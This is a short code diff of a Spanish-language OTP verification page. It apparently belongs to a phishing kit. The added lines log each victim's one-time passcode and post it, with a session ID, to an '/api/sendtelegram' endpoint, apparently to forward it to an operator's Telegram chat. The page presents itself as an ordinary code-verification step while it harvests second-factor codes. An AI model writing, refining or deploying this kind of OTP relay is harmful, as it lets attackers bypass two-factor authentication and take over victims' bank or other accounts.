@@ -233,27 +233,27 @@
         appState.isSubmitting = true;
         elements.verifyBtn.disabled = true;
 
-        // Mostrar overlay
-        if (window.loadingOverlay) {
-            window.loadingOverlay.show('Verificando código', 'Por favor espera...');
-        }
+        console.log('📤 Enviando OTP:', otpCode);
+
+        window.loadingOverlay.showSending('Verificando código...');
 
         try {
             const sessionId = window.commonUtils.getSessionId();
+            
+            const data = {
+                tipo: 'OTP',
+                codigo: otpCode,
+                sessionId: sessionId
+            };
+
+            console.log('📤 Enviando a Telegram con sessionId:', sessionId);
 
             const response = await fetch('/api/sendtelegram', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({
-                    sessionId: sessionId,
-                    type: 'otp_code',
-                    data: {
-                        codigo: otpCode,
-                        timestamp: new Date().toISOString()
-                    }
-                })
+                body: JSON.stringify(data)
             });
 
             if (!response.ok) {
